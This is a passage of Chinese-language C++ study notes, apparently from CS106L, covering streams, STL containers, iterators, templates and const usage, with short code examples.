<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 21 是右值</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">21</span>; <span class="comment">// 正确</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> = y; <span class="comment">// 错误</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>注意</strong>：当函数的参数声明为引用时，则不能在调用时使用右值作为参数</p>
<h2 id="stream">stream</h2>
<h3 id="stdcout">std::cout</h3>
<p>输出流在中的字符在被刷新到目标（终端）之前存储在中间缓冲区中</p>
<h3 id="stdstringstream">std::stringstream</h3>
<p>字符串流，用于处理（例如：分割）字符串。 示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="comment">// partial Bjarne Quote</span></span><br><span class="line">    std::string initial_quote = “Bjarne Stroustrup C makes it easy to shoot yourself in the foot\n<span class="string">"</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // create a stringstream</span></span><br><span class="line"><span class="string">    std::stringstream ss(initial_quote); // 初始化字符串流，可以用下面两行代替</span></span><br><span class="line"><span class="string">    /*</span></span><br><span class="line"><span class="string">    std::stringstream ss;</span></span><br><span class="line"><span class="string">	ss &lt;&lt; initial_quote;</span></span><br><span class="line"><span class="string">    */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // data destinations</span></span><br><span class="line"><span class="string">    std::string first;</span></span><br><span class="line"><span class="string">    std::string last;</span></span><br><span class="line"><span class="string">    std::string language, extracted_quote;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // &gt;&gt;运算符只读取到下一个whitespace(空格，\n，\t)</span></span><br><span class="line"><span class="string">    ss &gt;&gt; first &gt;&gt; last &gt;&gt; language;</span></span><br><span class="line"><span class="string">    // 要让extracted_quote等于"</span>makes it easy to shoot yourself in the foot<span class="string">"需要使用getline()</span></span><br><span class="line"><span class="string">    std::getline(ss, extracted_quote);</span></span><br><span class="line"><span class="string">    std::cout &lt;&lt; first &lt;&lt; “ ” &lt;&lt; last &lt;&lt; “ said this: ”&lt;&lt; language &lt;&lt; “ “ &lt;&lt; </span></span><br><span class="line"><span class="string">    extracted_quote &lt;&lt; std::endl;</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">istream&amp; <span class="title">getline</span><span class="params">(istream&amp; is, string&amp; str, <span class="type">char</span> delim)</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>读取输入流<code>is</code>，直到<code>delim</code>字符（默认是<code>\n</code>），并将其存储在某个缓冲区（变量）<code>str</code>中</p>
</blockquote>
<h3 id="stdflush">std::flush</h3>
<p>用于刷新<code>stream</code>流，将缓冲区中的数据<strong>立即</strong>发送到控制台（终端）</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Long operation in progress: "</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) {</span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">seconds</span>(<span class="number">1</span>));</span><br><span class="line">        std::cout &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">", "</span> &lt;&lt; std::flush;</span><br><span class="line">    }</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Operation completed!"</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 每隔一秒输出一个数字</span></span><br></pre></td></tr></tbody></table></figure>
<p>若上述代码不加<code>std::flush</code>，那么输出会在五秒后全部<strong>一次性显示</strong>。</p>
<p><code>std::cout</code>通常是行缓冲的，所以<code>std::endl</code>也会使得<code>stream</code>进行刷新，每次循环都会输出一个数字，但是这种行为使得运行效率低下，所以可以将<code>std::endl</code>换成<code>\n</code>，这样当缓冲区满或者循环结束时才会一次性输出（注意要提前声明<code>std::ios::sync_with_stdio(false);</code>）。</p>
<h3 id="stdofstream">std::ofstream</h3>
<p>Output File Stream，将数据写入文件。</p>
<p>示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line"><span class="comment">/// associating file on construction</span></span><br><span class="line">	<span class="function">std::ofstream <span class="title">ofs</span><span class="params">(“hello.txt”)</span></span>; <span class="comment">// 等价于下面两行</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    std::ofstream ofs; </span></span><br><span class="line"><span class="comment">    ofs.open(“hello.txt”);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (ofs.<span class="built_in">is_open</span>()) {  <span class="comment">// 检查文件是否已打开，如果已打开，则尝试向其写入字符串 </span></span><br><span class="line">		ofs &lt;&lt; “Hello CS106L!” &lt;&lt; ‘\n’; </span><br><span class="line">	}</span><br><span class="line">	ofs.<span class="built_in">close</span>();</span><br><span class="line">	ofs &lt;&lt; “<span class="keyword">this</span> will <span class="keyword">not</span> get written”; <span class="comment">// 由于文件流已关闭，会导致写入失败</span></span><br><span class="line">    </span><br><span class="line">	ofs.<span class="built_in">open</span>(“hello.txt”);</span><br><span class="line">	ofs &lt;&lt; “<span class="keyword">this</span> will though! It’s open again”;  <span class="comment">// 写入成功</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="stdcin">std::cin</h3>
<p><code>std::cin</code>也会先把字符存入缓冲区，然后从缓冲区中读取内容。</p>
<p>示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cin &gt;&gt; a;  <span class="comment">// 输入字符，存入缓冲区，然后从缓冲区读取字符到变量a</span></span><br></pre></td></tr></tbody></table></figure>
<p><code>std::cin</code>遇到whitespace则会停止存入缓冲区</p>
<p>Whitespace in C++ includes:</p>
<ul>
<li>“ ” – a literal space（空格）</li>
<li><code>\n</code> character</li>
<li><code>\t</code> character</li>
</ul>
<h2 id="stl">STL</h2>
<p>Standard Template Library</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250105162916455.png" alt="image-20250105162916455">
<figcaption aria-hidden="true">image-20250105162916455</figcaption>
</figure>
<h3 id="sequence-containers">Sequence Containers</h3>
<p>存放线性序列</p>
<h4 id="stdvector">std::vector</h4>
<p>使用 range-based for (适用于所有可迭代容器)遍历 vector</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> elem : vec) {  <span class="comment">// for (const auto&amp; elem : v) 可以节省副本的开销</span></span><br><span class="line">	std::cout &lt;&lt; elem &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>push_back()</code>： 会导致容器大小 <code>size()</code>
增加，同时如果没有足够空间，容量 <code>capacity()</code> 也随着增加</li>
<li><code>pop_back()</code>
：移除容器中最后一个元素，并将容器的<code>size()</code>减小，<strong>容量</strong>
(<code>capacity()</code>) 保持不变。</li>
</ul>
<h4 id="stddeque">std::deque</h4>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250107220918767.png" alt="image-20250107220918767">
<figcaption aria-hidden="true">image-20250107220918767</figcaption>
</figure>
<p><code>std::deque</code> 的底层实现结合了 <strong>分段内存</strong> 和
<strong>指针数组</strong> 的设计：</p>
<ol type="1">
<li><strong>分段存储</strong>：
<ul>
<li>与 <code>std::vector</code> 不同，<code>std::deque</code>
不使用一块连续的大内存块，而是将数据分为多个固定大小的内存块（称为缓冲区或
block）。</li>
<li>每个缓冲区的大小通常是固定的（具体大小依赖于实现，通常为 512
字节或更多）。</li>
</ul></li>
<li><strong>指针数组（Map Array）</strong>：
<ul>
<li><code>std::deque</code> 使用一个指针数组（称为 map
或控制块）来管理这些缓冲区。</li>
<li>这个指针数组存储了每个缓冲区的起始地址，并负责定位实际数据的位置。</li>
</ul></li>
</ol>
<h4 id="stdlist">std::list</h4>
<p><code>std::list</code> 是 C++ 标准库中的双向链表（Doubly Linked
List）容器，定义在 <code>&lt;list&gt;</code> 头文件中。与
<code>std::vector</code> 不同，<code>std::list</code>
允许高效地在序列的任意位置进行插入和删除操作，但不支持随机访问。</p>
<ul>
<li><strong>双向链表结构</strong>：每个元素都有前驱和后继指针。</li>
<li><strong>动态大小</strong>：不需要预分配内存，适用于频繁的插入/删除操作。</li>
<li><strong>高效的插入/删除</strong>：<code>O(1)</code>
复杂度，不涉及大规模元素移动。</li>
<li><strong>不支持随机访问</strong>：不能通过 <code>operator[]</code>
访问元素，必须使用迭代器。</li>
</ul>
<h3 id="associative-containers">Associative Containers</h3>
<p>通过 key 来组织元素</p>
<h4 id="stdmap">std::map</h4>
<ul>
<li><p>等价于python中的字典</p></li>
<li><p>示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; map {</span><br><span class="line">  { <span class="string">"Chris"</span>, <span class="number">2</span> },</span><br><span class="line">  { <span class="string">"CS106L"</span>, <span class="number">42</span> },</span><br><span class="line">  { <span class="string">"Keith"</span>, <span class="number">14</span> },</span><br><span class="line">  { <span class="string">"Nick"</span>, <span class="number">51</span> },</span><br><span class="line">  { <span class="string">"Sean"</span>, <span class="number">35</span> },</span><br><span class="line">};</span><br><span class="line"><span class="type">int</span> sean = map[<span class="string">"Sean"</span>]; <span class="comment">// 35</span></span><br><span class="line">map[<span class="string">"Chris"</span>] = <span class="number">31</span>;</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><code>std::map</code> 中，每个元素是一个 <code>std::pair</code>
对象，其中包含 <code>first</code> 和 <code>second</code>
两个成员。<code>first</code> 是键（key），<code>second</code>
是值（value）</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; map;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> kv : map) {</span><br><span class="line">  <span class="comment">// kv is a std::pair&lt;const std::string, int&gt;</span></span><br><span class="line">  std::string key = kv.first;</span><br><span class="line">  <span class="type">int</span> value = kv.second;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以通过结构化绑定遍历map</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; [key, value] : map) {</span><br><span class="line">  <span class="comment">// key has type const std::string&amp;</span></span><br><span class="line">  <span class="comment">// value has type const int&amp;</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>底层是通过 <strong>红黑树</strong>（Red-Black
Tree）来实现的。因此<code>std::map&lt;K, V&gt;</code>要求<code>K</code>能够进行<code>operator&lt;</code>操作（比大小，判断进入红黑树的左右哪个分支）</p></li>
</ul>
<h4 id="stdunordered_map">std::unordered_map</h4>
<ul>
<li><p>与 <code>std::map</code> 不同，<code>std::unordered_map</code>
是基于 <strong>哈希表（Hash Table）</strong> 实现的。</p></li>
<li><p>获取负载因子，设置最大负载因子，若超过则重新哈希</p>
<p>负载因子 = 元素个数（size）/ 桶的数量（bucket count）</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::unordered_map&lt;std::string, <span class="type">int</span>&gt; map;</span><br><span class="line"><span class="type">double</span> lf = map.<span class="built_in">load_factor</span>(); <span class="comment">// Get current load factor</span></span><br><span class="line">map.<span class="built_in">max_load_factor</span>(<span class="number">2.0</span>); <span class="comment">// Set the max load factor</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h4 id="stdset">std::set</h4>
<ul>
<li>集合中的每个元素都是唯一的</li>
<li><code>std::set</code> 的实现通常也是基于
<strong>红黑树</strong></li>
</ul>
<h4 id="stdunordered_set">std::unordered_set</h4>
<ul>
<li><code>std::unordered_set</code> 是基于 <strong>哈希表（Hash
Table）</strong> 实现的</li>
<li>如果你不需要排序，并且希望实现快速的查找和插入操作，<code>std::unordered_map</code>
是一个很好的选择。</li>
</ul>
<h3 id="iterator">Iterator</h3>
<p>track where we are in a container（类似于索引）</p>
<ul>
<li><p><code>container.begin()</code>指向容器的第一个元素</p></li>
<li><p><code>container.end()</code>指向容器末端（但不指向末尾元素）</p></li>
<li><p>当容器为空时，<code>container.begin() == container.end()</code></p></li>
<li><p>遍历容器</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面两段代码是等价的</span></span><br><span class="line"><span class="keyword">auto</span> b = s.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">auto</span> e = s.<span class="built_in">end</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = b; it != e; ++it)  <span class="comment">// 这里使用 ++it 可以减少一次不必要的拷贝</span></span><br><span class="line">{</span><br><span class="line">     <span class="keyword">auto</span> elem = *it;</span><br><span class="line">     std::cout &lt;&lt; elem;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// range-based for </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> elem : s) </span><br><span class="line">{</span><br><span class="line">	std::cout &lt;&lt; elem;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="继承inheritance">继承（Inheritance）</h2>
<p>多态性</p>
<h3 id="纯虚函数">纯虚函数</h3>
<p>动态多态，它在基类中被实例化，但在子类中被覆盖</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<h3 id="虚函数">虚函数</h3>
<p>https://hxt616.github.io/2024/10/26/CS106B/</p>
<h3 id="虚基类">虚基类</h3>
<p>解决菱形继承问题，详见<a target="_blank" rel="noopener" href="https://hxt616.github.io/2024/10/26/CS106B/">CS106B</a></p>
<h2 id="模板类template-classes">模板类（Template Classes）</h2>
<p>模板的声明和实现一般在同一个文件中</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// 'typename' 可替换成 'class'</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> <span class="function">T&amp; <span class="title">at</span><span class="params">(<span class="type">size_t</span> i)</span></span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// 在类外定义函数需要进行模板声明</span></span><br><span class="line">T&amp; Vector&lt;T&gt;::<span class="built_in">at</span>(<span class="type">size_t</span> i) { <span class="comment">// 注意这里类名后面要添加 &lt;T&gt;</span></span><br><span class="line"> <span class="comment">// Implementation...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="const">const</h2>
<p><code>const</code>
可以加在函数声明的前面或者后面，这两种用法的含义是不同的。主要有两种常见的情况：</p>
<h3 id="const-加在函数返回类型前面"><code>const</code>
加在函数返回类型前面</h3>
<p>这是指 <strong>返回值是 <code>const</code>
类型</strong>，意味着该返回值是不可修改的。</p>
<h4 id="示例">示例：</h4>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">int</span> <span class="title">getValue</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>在这个例子中，<code>const</code> 加在 <code>int</code>
前面，表示函数返回的是一个 <code>const int</code>。也就是说，返回的值是
<code>const</code> 类型，调用者不能修改它。</li>
<li>注意：这种 <code>const</code>
修饰符适用于返回值的类型，并不影响函数本身的行为。</li>
</ul>
<h4 id="使用场景">使用场景：</h4>
<ul>
<li>当函数返回一个对象时，如果返回的对象不希望被修改，可以加上
<code>const</code>。</li>
<li>例如，在返回一个指针、引用或常量时，<code>const</code>
会确保返回的对象不能被修改。</li>
</ul>
<h3 id="const-加在成员函数的后面"><code>const</code>
加在成员函数的后面</h3>
<p>这是指 <strong>成员函数是 <code>const</code>
成员函数</strong>，意味着该函数不能修改类的成员变量。</p>
<h4 id="示例-1">示例：</h4>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyClass</span>(<span class="type">int</span> v) : <span class="built_in">value</span>(v) {}</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const成员函数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getValue</span><span class="params">()</span> <span class="type">const</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非 const 成员函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setValue</span><span class="params">(<span class="type">int</span> v)</span> </span>{</span><br><span class="line">        value = v;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>在这个例子中，<code>getValue()</code> 后面的 <code>const</code>
表示该成员函数是 <strong><code>const</code>
成员函数</strong>，即它不会修改类的任何成员变量（即 <code>this</code>
指针指向的对象不会发生变化）。</li>
</ul>
<h4 id="关键点">关键点：</h4>
<ul>
<li><code>const</code> 加在成员函数的后面是为了声明这个成员函数是
<strong>只读的</strong>，即它不会修改对象的状态。</li>
<li>在 C++ 中，<strong><code>const</code> 成员函数只能调用其他
<code>const</code> 成员函数</strong>，不能修改成员变量，不能调用非
<code>const</code> 成员函数，也不能修改 <code>this</code>
指针指向的对象。</li>
</ul>
<h4 id="使用场景-1">使用场景：</h4>
<ul>
<li>当你希望保证某个成员函数不会修改类的状态时，应该将其声明为
<code>const</code> 成员函数。</li>
<li>例如，在查询类状态的函数（如获取值、大小、是否为空等）中，应该将其声明为
<code>const</code>，以便它们能够在 <code>const</code> 对象上调用。</li>
</ul>
<blockquote>
<p><strong>1. 指向常量的指针 (Pointer to const)</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span>* ptr;  <span class="comment">// 或等价的 int const* ptr;</span></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><strong>不能修改指向的对象</strong>：不能通过这个指针修改它指向的值</li>
<li><strong>可以修改指针本身</strong>：可以让指针指向其他地址</li>
</ul>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> y = <span class="number">20</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span>* ptr = &amp;x;</span><br><span class="line">*ptr = <span class="number">30</span>;  <span class="comment">// 错误：不能修改指向的对象</span></span><br><span class="line">ptr = &amp;y;   <span class="comment">// 正确：可以修改指针本身</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>2. 常量指针 (Const pointer)</strong></p>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="type">const</span> ptr;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><strong>不能修改指针本身</strong>：指针不能指向其他地址</li>
<li><strong>可以修改指向的对象</strong>：可以通过指针修改它指向的值</li>
</ul>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">20</span>;</span><br><span class="line"><span class="type">int</span>* <span class="type">const</span> ptr = &amp;x;</span><br><span class="line">*ptr = <span class="number">30</span>;  <span class="comment">// 正确：可以修改指向的对象</span></span><br><span class="line">ptr = &amp;y;   <span class="comment">// 错误：不能修改指针本身</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>3. 指向常量的常量指针 (Const pointer to const)</strong></p>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> ptr;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><strong>既不能修改指针本身</strong>：不能指向其他地址</li>
<li><strong>也不能修改指向的对象</strong>：不能通过指针修改值</li>
</ul>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> y = <span class="number">20</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> ptr = &amp;x;</span><br><span class="line">*ptr = <span class="number">30</span>;  <span class="comment">// 错误：不能修改指向的对象</span></span><br><span class="line">ptr = &amp;y;   <span class="comment">// 错误：不能修改指针本身</span></span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<h3 id="const_cast不常用"><code>const_cast</code>（不常用）</h3>
<p><code>const_cast</code> 的常见用法：</p>
<ol type="1">
<li><p><strong>去除 <code>const</code> 限定符</strong>： 通过
<code>const_cast</code>，可以将指向 <code>const</code>
对象的指针或引用转换为指向非 <code>const</code> 对象的指针或引用。</p>
<p>这种操作的危险性在于，如果你通过 <code>const_cast</code> 去除
<code>const</code>
限定符并尝试修改对象的内容，而对象本身确实是常量（例如，存储在
<code>const</code>
内存区域），这将导致未定义行为（UB）。因此，<strong>只有在你确定对象可以安全修改时</strong>，才应该去除
<code>const</code>。</p></li>
</ol>
<h2 id="模板函数template-functions">模板函数（Template Functions）</h2>
<ol type="1">
<li><p>示例：取两个变量的较小值</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">min</span><span class="params">(T a, T b)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显式实例化</span></span><br><span class="line"><span class="built_in">min</span>&lt;<span class="type">int</span>&gt;(<span class="number">7</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐式实例化，让编译器判断类型</span></span><br><span class="line"><span class="built_in">min</span>(<span class="number">7</span>, <span class="number">10</span>);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>可变参数模板函数：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">min</span><span class="params">(T a)</span> </span>{ <span class="comment">// 一定要加上，因为下面的模板是递归模板，需要一个终止条件</span></span><br><span class="line">    <span class="keyword">return</span> a;  <span class="comment">// 基本情况：只有一个元素时，返回该元素</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function">T <span class="title">min</span><span class="params">(T a, Args... args)</span> </span>{</span><br><span class="line">    T temp = <span class="built_in">min</span>(args...);  <span class="comment">// 递归调用：比较剩下的参数</span></span><br><span class="line">    <span class="keyword">return</span> a &lt; temp ? a : temp;  <span class="comment">// 返回较小的值</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><code>find</code>函数：</p>
